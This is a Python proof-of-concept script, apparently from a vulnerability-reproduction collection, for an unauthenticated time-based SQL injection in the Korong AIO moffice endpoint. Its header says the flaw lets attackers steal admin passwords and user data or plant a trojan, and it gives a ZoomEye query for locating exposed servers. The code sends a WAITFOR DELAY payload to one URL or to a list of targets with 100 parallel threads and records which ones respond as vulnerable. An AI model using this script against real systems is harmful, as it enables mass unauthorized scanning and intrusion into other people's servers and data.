#科荣 AIO moffice SQL注入漏洞复现
#科荣AI0 mofice 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
#科荣AIO V7
#钟馗之眼:"changeAccount('8000')" KRAIO_moffice_sql.py
import requests,re,argparse,sys,time,os
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()# 解除警告
from time import sleep
from colorama import Fore, Style
BLUE = Fore.BLUE
RESET = Style.RESET_ALL
def banner():
    banner ="""

 ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀    ███▄    █  ▒█████   █     █░ ▐██▌ 
▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒     ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░ ▐██▌ 
▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█  ▐██▌ 
░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█  ▓██▒ 
 ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██░   ▓██░░ ████▓▒░░░██▒██▓  ▒▄▄  
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒   ░▀▀▒ 
  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░   ░  ░ 
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░      ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░     ░    
                                    author:           🐖sawa🐇
                                    version:          1.0.0
                                    For:              科荣 AIO moffice SQL注入漏洞                                  ░                                                     
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description="this is a 科荣 AIO moffice  SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','-file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")# print("Usage:\n\t python3 {} -h".format(sys.argv[0]))

def poc(target):
    payload_url = "/moffice?op=showWorkPlan&planId=1';WAITFOR+DELAY+'0:0:5'--&sid=1"
    url = target+payload_url
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close',
    }
    # try:
    #     res1 = requests.get(target,verify=False,timeout=5)
    #     if res1.status_code == 200:
    #         res2 = requests.get(url=url,headers=headers,verify=False,timeout=5)
    #         sleep(2)
    #         res3 = requests.get(url=url,headers=headers,verify=False,timeout=5)
    #         time1 = res2.elapsed.total_seconds()
    #         time2 = res3.elapsed.total_seconds()
    #         # print(time1,time2)
    #         if res2.status_code == 200 and (time1 - time2) >= 5:
    #             print(f"{BLUE}[+]该{target}存在漏洞{RESET}")
    #             with open('result.txt','a',encoding='utf-8') as fp:
    #                 fp.write(target+"\n")
    #                 return True
    #     else:
    #         print(f"[-]该{target}不存在漏洞")
    #         return False
    # except Exception as e:
    #     print(f"[*]该url存在问题{target}"+str(e))
    #     return False
    try:
        res = requests.get(url=url,headers=headers,verify=False)
        time_taken = res.elapsed.total_seconds()
        # print(time)
        if res.status_code == 200 and 5 <= time_taken < 7:
            print(f"{BLUE}[+]该站点存在sql延时注入漏洞,url:{target}{RESET}")
            with open ('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else :
            print("[-]该站点不存在sql延时注入漏洞 ,url:"+target)
            with open ('without-bug.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")        
    except Exception as e:
        print(f"[*] 请求发生异常,URL: {target}, 错误信息: {str(e)}")
        with open ('warning.txt','a',encoding='utf-8') as fp:
            fp.write(target+"\n")

if __name__ == '__main__':
    main()
